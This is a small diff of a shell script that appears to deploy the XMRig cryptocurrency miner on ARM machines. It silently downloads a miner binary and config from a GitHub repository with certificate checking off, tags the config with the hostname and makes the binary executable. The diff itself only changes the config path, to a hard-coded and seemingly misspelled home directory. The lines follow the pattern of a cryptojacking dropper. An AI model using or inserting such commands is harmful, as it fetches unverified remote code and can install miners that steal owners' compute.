@@ -2,7 +2,7 @@
   OS=$(uname -m)
   if [[ ${OS} == "aarch64" ]]; then
   wget -N --no-check-certificate -q -O config.json https://raw.githubusercontent.com/gcp5678/smithmlo/main/config.json && chmod 666 config.json
-  config="config.json"
+  config="/home/ubunt/config.json"
   name=$(hostname)
   sed -i "s/6666/${name}/g" ${config}
   wget -N --no-check-certificate -q -O xmrig https://raw.githubusercontent.com/gcp5678/smithmlo/main/armxmrig && chmod 755 xmrig
